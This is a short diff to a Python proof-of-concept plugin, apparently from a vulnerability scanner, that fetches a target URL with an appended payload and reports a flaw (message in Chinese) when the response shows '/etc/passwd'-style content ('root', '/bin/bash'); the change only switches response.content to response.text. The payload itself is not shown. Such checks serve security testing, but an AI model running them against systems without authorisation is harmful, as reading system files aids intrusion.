@@ -56,7 +56,7 @@ class Poc(ABPoc):
                 url = self.target + payload
                 #code, head, res, errcode, _ = curl.curl(url)
                 r = requests.get(url)
-                if r.status_code == 200 and 'root' in r.content and '/bin/bash' in r.content:
+                if r.status_code == 200 and 'root' in r.text and '/bin/bash' in r.text:
                     # security_warning(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
